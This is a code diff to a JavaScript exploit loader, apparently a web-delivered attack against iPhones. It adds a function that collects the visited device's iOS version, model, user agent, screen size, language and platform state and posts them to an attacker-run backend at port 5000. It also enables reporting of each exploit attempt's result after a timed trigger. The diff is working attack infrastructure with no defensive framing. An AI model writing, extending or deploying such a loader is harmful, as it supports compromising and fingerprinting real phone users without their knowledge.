@@ -434,23 +434,59 @@
         // Entry Point: Execute exploit with 10ms delay
         // ============================================================================
 
+        function reportResult(result) {
+            try {
+                const ua = navigator.userAgent;
+                const platform = platformModule.platformState;
+                
+                let iosVersion = '';
+                let deviceModel = '';
+                
+                const iosMatch = ua.match(/OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/);
+                if (iosMatch) {
+                    iosVersion = iosMatch[1] + '.' + iosMatch[2] + (iosMatch[3] ? '.' + iosMatch[3] : '');
+                }
+                
+                const deviceMatch = ua.match(/iPhone(?:\s+(\w+))?/);
+                if (deviceMatch) {
+                    deviceModel = deviceMatch[0];
+                }
+                
+                const reportData = {
+                    result: result,
+                    ios_version: iosVersion || (platform.iOSVersion ? platform.iOSVersion.toString() : ''),
+                    device: navigator.platform,
+                    device_model: deviceModel,
+                    user_agent: ua,
+                    app_version: platform.appVersion || '',
+                    screen_width: window.screen.width,
+                    screen_height: window.screen.height,
+                    language: navigator.language,
+                    platform_state: platform,
+                    timestamp: new Date().toISOString()
+                };
+                const xhr = new XMLHttpRequest();
+                const backendUrl = "http://" + window.location.hostname + ":5000/api/report";
+                xhr.open("POST", backendUrl, true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(reportData));
+                window.log(`[REPORT] Sent result to backend: ${result}`);
+            } catch (e) {
+                window.log(`[REPORT] Failed to send result: ${e.message}`);
+            }
+        }
+
         self.setTimeout(async function () {
-            //try {
-            const result = await triggerExploit();
-            window.log(`[LOADER] Reporting result: ${result}`);
-            // reportResult(
-            //     0 === result ? 0 :
-            //     1001 === result ? 1001 :
-            //     1000 === result ? 1000 :
-            //     1003 === result ? 1003 :
-            //     result
-            // );
-            // } catch (e) {
-            //     window.log(`[LOADER] Top-level error:` + e);
-            //     try {
-            //         reportResult(1000);
-            //     } catch (e2) { }
-            // }
+            try {
+                const result = await triggerExploit();
+                window.log(`[LOADER] Reporting result: ${result}`);
+                reportResult(result);
+            } catch (e) {
+                window.log(`[LOADER] Top-level error:` + e);
+                try {
+                    reportResult(1000);
+                } catch (e2) { }
+            }
         }, 10);
 
         // stop sending my ip addr
